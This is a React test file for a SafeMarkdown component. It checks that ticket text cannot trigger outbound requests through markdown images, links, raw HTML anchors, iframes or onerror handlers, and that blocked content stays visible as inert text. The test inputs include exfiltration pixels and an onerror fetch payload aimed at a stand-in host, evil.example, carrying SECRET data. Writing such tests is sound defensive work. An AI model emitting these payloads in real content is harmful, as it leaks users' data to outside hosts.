import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { SafeMarkdown } from "./safeMarkdown.js";

describe("SafeMarkdown", () => {
  it("renders no <img> for a markdown image (no outbound request)", () => {
    const { container } = render(
      <SafeMarkdown>{"![status](https://evil.example/p.png?d=SECRET)"}</SafeMarkdown>,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("says the image was blocked, and quotes the alt so it reads as ticket text", () => {
    // "[image: status → ...]" was ambiguous: it never said the image had been
    // blocked, and an alt of "status" sat directly under the real "Status:"
    // field, reading as a duplicate label rather than as attacker-written text.
    const { container } = render(
      <SafeMarkdown>{"![status](https://evil.example/p.png?d=SECRET)"}</SafeMarkdown>,
    );
    const text = container.textContent ?? "";
    expect(text).toContain("blocked image");
    expect(text).toContain('"status"');
  });

  it("shows the image URL as inert text instead of dropping it silently", () => {
    // Dropping it left a description with a hole in it: "embedding the result in
    // The customer was..." reads as ordinary prose, so a reader cannot tell that
    // a ticket tried to plant an exfil pixel. Same rule the delimiters and links
    // already follow — neutralize visibly, never silently.
    const { container } = render(
      <SafeMarkdown>{"before ![status](https://evil.example/p.png?d=SECRET) after"}</SafeMarkdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("https://evil.example/p.png?d=SECRET");
    expect(container.textContent).toContain("before");
    expect(container.textContent).toContain("after");
  });

  it("keeps the alt text of a neutralized image, which is attacker-controlled too", () => {
    const { container } = render(
      <SafeMarkdown>{"![click here now](https://evil.example/x.png)"}</SafeMarkdown>,
    );
    expect(container.textContent).toContain("click here now");
    expect(container.querySelector("img")).toBeNull();
  });

  it("does not turn a neutralized image into a clickable link", () => {
    const { container } = render(
      <SafeMarkdown>{"![x](https://evil.example/p.png)"}</SafeMarkdown>,
    );
    expect(container.querySelector("a")).toBeNull();
    expect(container.innerHTML).not.toContain("href");
  });

  it("keeps a single newline as a visible line break", () => {
    // A ticket listing arrives as one line per field. CommonMark folds a lone
    // newline into a space, so without this the whole ticket renders as one
    // run-on paragraph — which is exactly what the UI was showing.
    const { container } = render(
      <SafeMarkdown>{"TA-1: Login returns 500\nStatus: open\nDescription: Users see a 500."}</SafeMarkdown>,
    );
    expect(container.querySelectorAll("br").length).toBe(2);
  });

  it("does not turn a line break into an outbound-request opportunity", () => {
    // The break plugin must not widen what can be rendered: an image on its own
    // line is still dropped.
    const { container } = render(
      <SafeMarkdown>{"line one\n![x](https://evil.example/p.png)\nline three"}</SafeMarkdown>,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("renders no <a href> for a markdown link, showing the URL as inert text", () => {
    const { container } = render(
      <SafeMarkdown>{"[click me](https://evil.example/steal?d=SECRET)"}</SafeMarkdown>,
    );
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("click me");
    expect(container.textContent).toContain("https://evil.example/steal?d=SECRET");
  });

  it("strips raw HTML, including an onerror image payload", () => {
    const { container } = render(
      <SafeMarkdown>{'<img src=x onerror="fetch(\'https://evil.example\')">'}</SafeMarkdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.innerHTML).not.toContain("onerror");
  });

  it("strips a raw HTML anchor", () => {
    const { container } = render(
      <SafeMarkdown>{'<a href="https://evil.example">click</a>'}</SafeMarkdown>,
    );
    expect(container.querySelector("a")).toBeNull();
  });

  it("strips an iframe", () => {
    const { container } = render(
      <SafeMarkdown>{'<iframe src="https://evil.example"></iframe>'}</SafeMarkdown>,
    );
    expect(container.querySelector("iframe")).toBeNull();
  });

  it("still renders ordinary formatting", () => {
    const { container } = render(<SafeMarkdown>{"**bold** and `code`"}</SafeMarkdown>);
    expect(container.querySelector("strong")?.textContent).toBe("bold");
    expect(container.querySelector("code")?.textContent).toBe("code");
  });
});
